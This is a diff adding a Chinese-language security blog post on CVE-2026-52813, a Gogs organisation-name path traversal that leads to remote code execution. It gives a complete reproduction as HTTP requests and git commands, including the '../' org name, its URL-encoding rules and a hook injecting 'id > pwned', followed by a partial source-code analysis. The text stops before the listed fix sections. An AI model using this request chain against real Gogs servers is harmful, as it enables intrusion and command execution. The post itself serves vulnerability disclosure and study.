@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。"><meta name="theme-color" content="#f5f2eb"><title>Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813） — hongzh0's Blog</title>
+<link rel="canonical" href="https://hongzh0.wiki/posts/gogs-organization-name-path-traversal-rce.html"><link rel="alternate" type="application/rss+xml" title="hongzh0's Blog RSS" href="/feed.xml"><link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="og:site_name" content="hongzh0's Blog"><meta property="og:title" content="Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813）"><meta property="og:description" content="从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。"><meta property="og:url" content="https://hongzh0.wiki/posts/gogs-organization-name-path-traversal-rce.html"><meta property="og:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta property="og:image:alt" content="hongzh0 的个人照片"><meta property="og:image:width" content="960"><meta property="og:image:height" content="960"><meta property="article:published_time" content="2026-07-04T14:16:32.000Z">
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813）"><meta name="twitter:description" content="从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。"><meta name="twitter:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta name="twitter:image:alt" content="hongzh0 的个人照片">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813）","description":"从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。","image":"https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg","datePublished":"2026-07-04T14:16:32.000Z","dateModified":"2026-07-04T14:16:32.000Z","inLanguage":"zh-CN","mainEntityOfPage":"https://hongzh0.wiki/posts/gogs-organization-name-path-traversal-rce.html","url":"https://hongzh0.wiki/posts/gogs-organization-name-path-traversal-rce.html","author":{"@type":"Person","name":"hongzh0","url":"https://hongzh0.wiki/about.html"},"publisher":{"@type":"Person","name":"hongzh0"}}</script><link rel="stylesheet" href="/assets/fonts/font-face.css?v=e669a6bd36ee"><link rel="stylesheet" href="../assets/style.css?v=e669a6bd36ee"><script>try{const saved=localStorage.getItem('theme');const theme=saved==='dark'||saved==='light'?saved:(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');const color=theme==='dark'?'#1b1d19':'#f5f2eb';document.documentElement.dataset.theme=theme;document.documentElement.style.colorScheme=theme;document.querySelector('meta[name="theme-color"]')?.setAttribute('content',color)}catch{document.documentElement.dataset.theme='light';document.documentElement.style.colorScheme='light'}</script></head><body>
+<div class="reading-progress" aria-hidden="true"><span></span></div><a class="skip-link" href="#article">跳到正文</a><header class="site-header"><a class="brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><button type="button" class="menu-toggle" aria-label="打开导航" aria-controls="site-navigation" aria-expanded="false"><span aria-hidden="true"></span><span aria-hidden="true"></span></button><nav class="site-nav" id="site-navigation" aria-label="主导航"><a href="../index.html">首页</a><a href="../archive.html">归档</a><a href="../links.html">友链</a><a href="../about.html">关于</a><button type="button" class="theme-toggle" aria-label="切换深浅色主题" aria-pressed="false"><span class="sun" aria-hidden="true">☼</span><span class="moon" aria-hidden="true">◐</span></button></nav></header>
+<main id="main"><section class="article-hero wrap"><header class="article-header"><a class="article-breadcrumb" href="../archive.html"><span aria-hidden="true">←</span> 文章归档 / 漏洞分析</a><div class="post-meta"><span>漏洞分析</span><time datetime="2026-07-04T14:16:32.000Z">2026.07.04</time><span>25 分钟阅读</span><span class="post-badge">定风波Agent复现</span></div><h1>Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813）</h1><p class="article-lead">从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。</p><dl class="article-facts"><div><dt>PUBLISHED</dt><dd>2026.07.04</dd></div><div><dt>READING</dt><dd>25 MIN</dd></div><div><dt>SECTIONS</dt><dd>08</dd></div><div><dt>VIEWS</dt><dd id="busuanzi_page_pv">—</dd></div></dl></header>
+<div class="featured-visual article-cover"><span class="visual-grid" aria-hidden="true"></span><span class="visual-orbit orbit-one" aria-hidden="true"></span><span class="visual-orbit orbit-two" aria-hidden="true"></span><span class="visual-center" data-cover-length="4" aria-hidden="true">Gogs</span><span class="visual-caption" aria-hidden="true">SECURITY RESEARCH · 2026-07-04</span></div></section>
+<details class="mobile-toc wrap"><summary><span>文章目录</span><small>08 SECTIONS</small></summary><nav aria-label="移动端文章目录"><a href="#section-1-漏洞简介-1">1. 漏洞简介</a><a href="#section-2-漏洞概述-2">2. 漏洞概述</a><a href="#section-3-利用条件-3">3. 利用条件</a><a class="toc-h3" href="#section-3-1-影响版本-4">3.1 影响版本</a><a class="toc-h3" href="#section-3-2-所需权限-5">3.2 所需权限</a><a href="#section-4-环境搭建-6">4. 环境搭建</a><a href="#section-5-漏洞复现-7">5. 漏洞复现</a><a class="toc-h3" href="#section-5-1-复现结果-8">5.1 复现结果</a><a class="toc-h3" href="#section-5-2-公开-poc-9">5.2 公开 PoC</a><a class="toc-h3" href="#section-5-3-复现流程-10">5.3 复现流程</a><a class="toc-h4" href="#section-5-3-1-注册攻击者账号-11">5.3.1 注册攻击者账号</a><a class="toc-h4" href="#section-5-3-2-获取-api-token-12">5.3.2 获取 API Token</a><a class="toc-h4" href="#section-5-3-3-创建-writer-仓库-13">5.3.3 创建 Writer 仓库</a><a class="toc-h4" href="#section-5-3-4-web-editor-写-dummy-文件-触发-local-r-工作树创建-14">5.3.4 Web Editor 写 Dummy 文件（触发 local-r 工作树创建）</a><a class="toc-h4" href="#section-5-3-5-查询-writer-仓库-id-local-r-编号-15">5.3.5 查询 Writer 仓库 ID（local-r 编号）</a><a class="toc-h4" href="#section-5-3-6-创建恶意组织-路径遍历注入-16">5.3.6 创建恶意组织（路径遍历注入）</a><a class="toc-h4" href="#section-5-3-7-在恶意组织下创建仓库-17">5.3.7 在恶意组织下创建仓库</a><a class="toc-h4" href="#section-5-3-8-clone-writer-注入-hook-push-18">5.3.8 Clone Writer → 注入 Hook → Push</a><a class="toc-h4" href="#section-5-3-9-api-sync-writer-触发-git-reset-hard-覆盖-hook-19">5.3.9 API Sync Writer（触发 git reset --hard，覆盖 Hook）</a><a class="toc-h4" href="#section-5-3-10-trigger-org-仓库-触发-hook-执行-20">5.3.10 Trigger Org 仓库（触发 Hook 执行）</a><a class="toc-h4" href="#section-5-3-11-api-sync-writer-拉取-pwned-回显-21">5.3.11 API Sync Writer（拉取 pwned 回显）</a><a class="toc-h4" href="#section-5-3-12-获取-rce-回显-22">5.3.12 获取 RCE 回显</a><a href="#section-6-漏洞分析-23">6. 漏洞分析</a><a class="toc-h3" href="#section-6-1-路径遍历的实现-24">6.1 路径遍历的实现</a><a class="toc-h3" href="#section-6-2-rce-的实现-25">6.2 RCE 的实现</a><a href="#section-7-修复建议-26">7. 修复建议</a><a class="toc-h3" href="#section-7-1-版本自查-27">7.1 版本自查</a><a class="toc-h3" href="#section-7-2-gogs-升级-28">7.2 Gogs 升级</a><a class="toc-h3" href="#section-7-3-临时缓解措施-29">7.3 临时缓解措施</a><a class="toc-h4" href="#section-7-3-1-禁用用户自助注册-30">7.3.1 禁用用户自助注册</a><a class="toc-h4" href="#section-7-3-2-以受限用户运行-gogs-进程-31">7.3.2 以受限用户运行 Gogs 进程</a><a class="toc-h4" href="#section-7-3-3-文件系统监控与利用痕迹检测-32">7.3.3 文件系统监控与利用痕迹检测</a><a href="#section-8-参考链接-33">8. 参考链接</a></nav></details><div class="article-layout" id="article"><aside class="article-toc" aria-label="文章目录"><div class="article-toc-head"><span>CONTENTS</span><small>08 SECTIONS</small></div><nav class="article-toc-nav"><a href="#section-1-漏洞简介-1">1. 漏洞简介</a><a href="#section-2-漏洞概述-2">2. 漏洞概述</a><a href="#section-3-利用条件-3">3. 利用条件</a><a class="toc-h3" href="#section-3-1-影响版本-4">3.1 影响版本</a><a class="toc-h3" href="#section-3-2-所需权限-5">3.2 所需权限</a><a href="#section-4-环境搭建-6">4. 环境搭建</a><a href="#section-5-漏洞复现-7">5. 漏洞复现</a><a class="toc-h3" href="#section-5-1-复现结果-8">5.1 复现结果</a><a class="toc-h3" href="#section-5-2-公开-poc-9">5.2 公开 PoC</a><a class="toc-h3" href="#section-5-3-复现流程-10">5.3 复现流程</a><a class="toc-h4" href="#section-5-3-1-注册攻击者账号-11">5.3.1 注册攻击者账号</a><a class="toc-h4" href="#section-5-3-2-获取-api-token-12">5.3.2 获取 API Token</a><a class="toc-h4" href="#section-5-3-3-创建-writer-仓库-13">5.3.3 创建 Writer 仓库</a><a class="toc-h4" href="#section-5-3-4-web-editor-写-dummy-文件-触发-local-r-工作树创建-14">5.3.4 Web Editor 写 Dummy 文件（触发 local-r 工作树创建）</a><a class="toc-h4" href="#section-5-3-5-查询-writer-仓库-id-local-r-编号-15">5.3.5 查询 Writer 仓库 ID（local-r 编号）</a><a class="toc-h4" href="#section-5-3-6-创建恶意组织-路径遍历注入-16">5.3.6 创建恶意组织（路径遍历注入）</a><a class="toc-h4" href="#section-5-3-7-在恶意组织下创建仓库-17">5.3.7 在恶意组织下创建仓库</a><a class="toc-h4" href="#section-5-3-8-clone-writer-注入-hook-push-18">5.3.8 Clone Writer → 注入 Hook → Push</a><a class="toc-h4" href="#section-5-3-9-api-sync-writer-触发-git-reset-hard-覆盖-hook-19">5.3.9 API Sync Writer（触发 git reset --hard，覆盖 Hook）</a><a class="toc-h4" href="#section-5-3-10-trigger-org-仓库-触发-hook-执行-20">5.3.10 Trigger Org 仓库（触发 Hook 执行）</a><a class="toc-h4" href="#section-5-3-11-api-sync-writer-拉取-pwned-回显-21">5.3.11 API Sync Writer（拉取 pwned 回显）</a><a class="toc-h4" href="#section-5-3-12-获取-rce-回显-22">5.3.12 获取 RCE 回显</a><a href="#section-6-漏洞分析-23">6. 漏洞分析</a><a class="toc-h3" href="#section-6-1-路径遍历的实现-24">6.1 路径遍历的实现</a><a class="toc-h3" href="#section-6-2-rce-的实现-25">6.2 RCE 的实现</a><a href="#section-7-修复建议-26">7. 修复建议</a><a class="toc-h3" href="#section-7-1-版本自查-27">7.1 版本自查</a><a class="toc-h3" href="#section-7-2-gogs-升级-28">7.2 Gogs 升级</a><a class="toc-h3" href="#section-7-3-临时缓解措施-29">7.3 临时缓解措施</a><a class="toc-h4" href="#section-7-3-1-禁用用户自助注册-30">7.3.1 禁用用户自助注册</a><a class="toc-h4" href="#section-7-3-2-以受限用户运行-gogs-进程-31">7.3.2 以受限用户运行 Gogs 进程</a><a class="toc-h4" href="#section-7-3-3-文件系统监控与利用痕迹检测-32">7.3.3 文件系统监控与利用痕迹检测</a><a href="#section-8-参考链接-33">8. 参考链接</a></nav></aside><article class="article-content"><blockquote>
+<p><strong>实验说明：</strong> 本文记录授权测试环境中的漏洞复现与代码审计过程。请求、Token、账号及命令均为实验数据，请勿用于未授权目标；建议在隔离容器或测试虚拟机中完成验证。</p>
+</blockquote>
+<h2 id="section-1-漏洞简介-1">1. 漏洞简介</h2>
+<p>Gogs 是一款基于 Go 语言开发的开源自托管 Git 服务，提供代码托管、仓库管理、Issue 跟踪、Wiki 等功能，支持通过 Docker 或二进制方式部署，广泛应用于个人开发者和小型团队的私有代码管理场景。</p>
+<h2 id="section-2-漏洞概述-2">2. 漏洞概述</h2>
+<p><strong>漏洞编号：CVE-2026-52813</strong></p>
+<p>Gogs 在创建组织（Organization）时，未对组织名称进行路径遍历字符（如 <code>../</code>）的过滤或清理。源码文件 <code>internal/database/org.go</code> 中直接调用 <code>os.MkdirAll(repox.UserPath(org.Name))</code>，而 <code>internal/repox/repox.go</code> 中的 <code>UserPath</code> 函数未对 <code>org.Name</code> 做任何路径清理处理，导致攻击者可以将组织名称设置为包含路径遍历序列的字符串（如 <code>../../../../data/gogs/data/tmp/local-r/1/nested</code>）。当在该恶意组织下创建仓库时，仓库数据被写入到路径遍历解析后的任意文件系统位置。默认配置下 Gogs 开启自助注册，攻击者仅需自助注册一个普通账号（无需管理员审批或授权）即可利用此漏洞：将仓库写入另一个仓库的本地工作树目录中，进而通过 Git 操作覆写目标仓库的 <code>hooks/update</code> 脚本，注入恶意 Shell 命令。当 Gogs 与目标仓库交互触发 Git Hook 时，注入的命令即作为 <code>git</code> 用户执行，实现远程代码执行，导致服务器遭受严重入侵（以 <code>git</code> 用户身份执行任意系统命令）。</p>
+<h2 id="section-3-利用条件-3">3. 利用条件</h2>
+<h3 id="section-3-1-影响版本-4">3.1 影响版本</h3>
+<ul>
+<li>Gogs <code>&gt;= 0.2.0, &lt; 0.14.3</code>，即 0.2.0 至 0.14.2。</li>
+<li>Go 模块 <code>gogs.io/gogs &gt;= v0.0.0-20140322175050, &lt; v0.14.3</code>。</li>
+</ul>
+<h3 id="section-3-2-所需权限-5">3.2 所需权限</h3>
+<p>攻击者需要一个平台普通用户账号即可远程利用。默认开放自助注册的实例攻击面更大；公开资料中已经存在可用 PoC。</p>
+<h2 id="section-4-环境搭建-6">4. 环境搭建</h2>
+<pre><code class="language-bash">docker pull gogs/gogs:0.14.1
+</code></pre>
+<p>拉取镜像后，按照实验网络与数据卷规划启动容器并完成初始化。本文复现环境的运行状态如下：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260626214100915.png" alt="Gogs 漏洞分析截图 01" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260626214100915.png" referrerpolicy="no-referrer">
+
+<h2 id="section-5-漏洞复现-7">5. 漏洞复现</h2>
+<h3 id="section-5-1-复现结果-8">5.1 复现结果</h3>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260626213252151.png" alt="Gogs 漏洞分析截图 02" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260626213252151.png" referrerpolicy="no-referrer">
+
+<h3 id="section-5-2-公开-poc-9">5.2 公开 PoC</h3>
+<p><a href="https://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9">公开 PoC：JorianWoltjer Gist</a></p>
+<h3 id="section-5-3-复现流程-10">5.3 复现流程</h3>
+<h4 id="section-5-3-1-注册攻击者账号-11">5.3.1 注册攻击者账号</h4>
+<pre><code class="language-http">POST /user/sign_up HTTP/1.1
+Host: 192.168.131.134:3000
+Content-Type: application/x-www-form-urlencoded
+
+ _csrf=xxx&amp;user_name=hongzh0&amp;email=hongzh0%40test.local&amp;password=123456&amp;retype=123456
+</code></pre>
+<hr>
+<h4 id="section-5-3-2-获取-api-token-12">5.3.2 获取 API Token</h4>
+<pre><code class="language-http">POST /api/v1/users/hongzh0/tokens HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: Basic aG9uZ3poMDoxMjM0NTY=
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;api&quot;}
+</code></pre>
+<p>Authorization 为 <code>hongzh0:123456</code> 的 base64。</p>
+<hr>
+<h4 id="section-5-3-3-创建-writer-仓库-13">5.3.3 创建 Writer 仓库</h4>
+<pre><code class="language-http">POST /api/v1/user/repos HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;writer-42c09a64&quot;,&quot;description&quot;:&quot;writer repo for poc&quot;,&quot;private&quot;:false,&quot;auto_init&quot;:true,&quot;readme&quot;:&quot;Default&quot;}
+</code></pre>
+<hr>
+<h4 id="section-5-3-4-web-editor-写-dummy-文件-触发-local-r-工作树创建-14">5.3.4 Web Editor 写 Dummy 文件（触发 local-r 工作树创建）</h4>
+<p>如果跳过此步骤，<code>local-r/X/.git</code> 不存在，后续 push 无法触发 <code>git reset --hard</code>。</p>
+<p><strong>4a. Web 登录获取 Session Cookie：</strong></p>
+<pre><code class="language-http">POST /user/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+
+_csrf=xxx&amp;user_name=hongzh0&amp;password=123456&amp;login_source=0
+</code></pre>
+<p><strong>4b. Web Editor 创建文件：</strong></p>
+<pre><code class="language-http">POST /hongzh0/writer-42c09a64/_new/main/ HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+
+_csrf=xxx&amp;last_commit=xxx&amp;tree_path=dummy.txt&amp;content=dummy&amp;commit_summary=&amp;commit_message=&amp;commit_choice=direct&amp;new_branch_name=
+</code></pre>
+<p>文件创建成功，同时 Gogs 在 <code>/data/gogs/data/tmp/local-r/1/</code> 创建完整 git clone</p>
+<hr>
+<h4 id="section-5-3-5-查询-writer-仓库-id-local-r-编号-15">5.3.5 查询 Writer 仓库 ID（local-r 编号）</h4>
+<pre><code class="language-http">GET /api/v1/repos/hongzh0/writer-42c09a64 HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+</code></pre>
+<p><code>id=1</code> → 工作树路径为 <code>/data/gogs/data/tmp/local-r/1/</code></p>
+<hr>
+<h4 id="section-5-3-6-创建恶意组织-路径遍历注入-16">5.3.6 创建恶意组织（路径遍历注入）</h4>
+<pre><code class="language-http">POST /api/v1/user/orgs HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;username&quot;:&quot;../../../../../data/gogs/data/tmp/local-r/1/nessted&quot;,&quot;full_name&quot;:&quot;deep&quot;}
+</code></pre>
+<p><strong>注意:</strong> Docker 容器内 <code>/app/gogs/data</code> → <code>/data/gogs/data</code> 是 symlink，需要 <strong>5 层</strong> <code>../</code>（裸机部署用 4 层）。</p>
+<p>组织目录创建在 local-r/1/ 工作树内</p>
+<hr>
+<h4 id="section-5-3-7-在恶意组织下创建仓库-17">5.3.7 在恶意组织下创建仓库</h4>
+<pre><code class="language-http">POST /api/v1/org/..%2F..%2F..%2F..%2F..%2Fdata%2Fgogs%2Fdata%2Ftmp%2Flocal-r%2F1%2Fnessted/repos HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;rce-9d862f6c&quot;,&quot;description&quot;:&quot;poc&quot;,&quot;private&quot;:false,&quot;auto_init&quot;:true,&quot;readme&quot;:&quot;Default&quot;}
+</code></pre>
+<p><strong>编码规则:</strong> Org 名中的 <code>/</code> 全编码为 <code>%2F</code>，但 org 和 repo 名之间的 <code>/</code> 保持原始 <code>/</code>（不编码）</p>
+<hr>
+<h4 id="section-5-3-8-clone-writer-注入-hook-push-18">5.3.8 Clone Writer → 注入 Hook → Push</h4>
+<pre><code class="language-bash">git clone http://hongzh0:123456@127.0.0.1:3000/hongzh0/writer-42c09a64.git
+cd writer-42c09a64
+git config user.email &quot;poc@test.local&quot;
+git config user.name &quot;poc&quot;
+mkdir -p nessted/rce-9d862f6c.git/hooks
+echo &#39;id &gt; pwned&#39; &gt; nessted/rce-9d862f6c.git/hooks/update
+chmod +x nessted/rce-9d862f6c.git/hooks/update
+git add -A
+git commit -m &quot;inject hook&quot;
+git push origin main
+</code></pre>
+<p>Push 将恶意 hook 文件写入 Writer 仓库的 bare repo（位于 <code>/data/gogs/data/git/gogs-repositories/hongzh0/writer-42c09a64.git</code>）。但此时 local-r/1 工作树尚未同步，嵌套裸仓库的 hooks 仍是 Gogs 默认包装器。</p>
+<hr>
+<h4 id="section-5-3-9-api-sync-writer-触发-git-reset-hard-覆盖-hook-19">5.3.9 API Sync Writer（触发 git reset --hard，覆盖 Hook）</h4>
+<pre><code class="language-http">PUT /api/v1/repos/hongzh0/writer-42c09a64/contents/sync1.txt HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;message&quot;:&quot;sync workspace&quot;,&quot;content&quot;:&quot;c3luYw==&quot;,&quot;branch&quot;:&quot;main&quot;}
+</code></pre>
+<p>此操作触发 Gogs 执行：<code>git --work-tree=/data/gogs/data/tmp/local-r/1 reset --hard</code>，Writer 仓库的最新状态（含恶意 hook）覆盖 local-r/1 工作树，<strong>覆盖嵌套裸仓库 <code>rce-9d862f6c.git/hooks/update</code></strong>。</p>
+<hr>
+<h4 id="section-5-3-10-trigger-org-仓库-触发-hook-执行-20">5.3.10 Trigger Org 仓库（触发 Hook 执行）</h4>
+<pre><code class="language-http">PUT /api/v1/repos/..%2F..%2F..%2F..%2F..%2Fdata%2Fgogs%2Fdata%2Ftmp%2Flocal-r%2F1%2Fnessted/rce-9d862f6c/contents/trigger.txt HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;message&quot;:&quot;trigger rce&quot;,&quot;content&quot;:&quot;dHJpZ2dlcg==&quot;,&quot;branch&quot;:&quot;main&quot;}
+</code></pre>
+<p><strong>编码注意:</strong> org 名部分（直到 <code>nessted</code>）全编码，repo 名 (<code>rce-9d862f6c</code>) 和后续路径 (<code>contents/trigger.txt</code>) 用原始 <code>/</code>。</p>
+<p>Gogs 操作 org 仓库时执行 Git 命令 → 触发 <code>hooks/update</code> → 命令 <code>id &gt; pwned</code> 以 git 用户身份执行。</p>
+<hr>
+<h4 id="section-5-3-11-api-sync-writer-拉取-pwned-回显-21">5.3.11 API Sync Writer（拉取 pwned 回显）</h4>
+<pre><code class="language-http">PUT /api/v1/repos/hongzh0/writer-42c09a64/contents/sync2.txt HTTP/1.1
+Host: 192.168.131.134:3000
+Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
+Content-Type: application/json
+
+{&quot;message&quot;:&quot;sync result&quot;,&quot;content&quot;:&quot;c3luYzI=&quot;,&quot;branch&quot;:&quot;main&quot;}
+</code></pre>
+<p>再次触发 <code>git reset --hard</code>，由于 <code>pwned</code> 文件位于工作树内（由 hook 创建），它被识别为新增文件出现在工作树中。</p>
+<hr>
+<h4 id="section-5-3-12-获取-rce-回显-22">5.3.12 获取 RCE 回显</h4>
+<p><strong>实例 URL：</strong> <code>http://192.168.131.134:3000/hongzh0/writer-42c09a64/raw/main/nessted/rce-9d862f6c.git/pwned</code>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260704163850811.png" alt="Gogs 漏洞分析截图 03" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260704163850811.png" referrerpolicy="no-referrer"></p>
+<h2 id="section-6-漏洞分析-23">6. 漏洞分析</h2>
+<h3 id="section-6-1-路径遍历的实现-24">6.1 路径遍历的实现</h3>
+<p><code>internal/route/api/v1/api.go</code> 定义了 REST API 路由；是否使用 <code>reqToken()</code> 可以帮助判断接口所需的认证权限。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260628005521946.png" alt="Gogs 漏洞分析截图 04" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260628005521946.png" referrerpolicy="no-referrer">
+
+<p>路由采用分层映射，组织创建接口最终对应 <code>/api/v1/user/orgs</code>。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629115650861.png" alt="Gogs 漏洞分析截图 05" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629115650861.png" referrerpolicy="no-referrer">
+
+<p>继续查看 <code>CreateOrgOption</code>，可以看到 <code>UserName</code> 直接承接用户输入，仅进行了非空检查，没有路径规范化或格式约束。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629145605625.png" alt="Gogs 漏洞分析截图 06" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629145605625.png" referrerpolicy="no-referrer">
+
+<p>从 <code>api.go</code> 跟入 <code>CreateMyOrg</code> 和 <code>CreateOrgForUser</code>：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629102248083.png" alt="Gogs 漏洞分析截图 07" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629102248083.png" referrerpolicy="no-referrer">
+
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629104759871.png" alt="Gogs 漏洞分析截图 08" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629104759871.png" referrerpolicy="no-referrer">
+
+<p><code>CreateOrgForUser</code> 主要检查用户名是否已存在以及是否被禁止，但这些检查并未覆盖路径遍历输入。继续进入 <code>CreateOrganization</code>，第一层调用为 <code>isUsernameAllowed</code>。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629113824454.png" alt="Gogs 漏洞分析截图 09" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629113824454.png" referrerpolicy="no-referrer">
+
+<p><code>isUsernameAllowed</code> 使用 <code>reservedUsernames</code> 作为保留名称黑名单：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629113931774.png" alt="Gogs 漏洞分析截图 10" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629113931774.png" referrerpolicy="no-referrer">
+
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629114016649.png" alt="Gogs 漏洞分析截图 11" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629114016649.png" referrerpolicy="no-referrer">
+
+<p>因此，从 API 创建组织时主要经过以下三类检查：</p>
+<ol>
+<li>名称是否为空。</li>
+<li>名称是否已经存在。</li>
+<li>名称是否与保留名称黑名单完全匹配。</li>
+</ol>
+<p>黑名单虽然包含 <code>.</code> 和 <code>..</code>，但 <code>isUsernameAllowed</code> 采用完整字符串匹配。输入为 <code>..</code> 时会被拦截，输入为 <code>../</code> 或更长的路径遍历序列时则不会命中黑名单。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629113549076.png" alt="Gogs 漏洞分析截图 12" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629113549076.png" referrerpolicy="no-referrer">
+
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629114555991.png" alt="Gogs 漏洞分析截图 13" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629114555991.png" referrerpolicy="no-referrer">
+
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629114653406.png" alt="Gogs 漏洞分析截图 14" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629114653406.png" referrerpolicy="no-referrer">
+
+<p>Web 端组织创建路由位于 <code>internal/cmd/web.go</code>：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629152450598.png" alt="Gogs 漏洞分析截图 15" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629152450598.png" referrerpolicy="no-referrer">
+
+<p>Web 端的 <code>CreateOrg</code> 使用了额外的名称格式校验：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629152740483.png" alt="Gogs 漏洞分析截图 16" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629152740483.png" referrerpolicy="no-referrer">
+
+<p>其中 <code>AlphaDashDot</code> 是 Macaron 框架提供的正则校验规则。API 调用链没有应用这项规则，因此 Web 表单受到约束，并不代表对应 API 同样安全。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629153143065.png" alt="Gogs 漏洞分析截图 17" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629153143065.png" referrerpolicy="no-referrer">
+
+<p>继续查看 <code>CreateOrganization</code>：</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629104441652.png" alt="Gogs 漏洞分析截图 18" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629104441652.png" referrerpolicy="no-referrer">
+
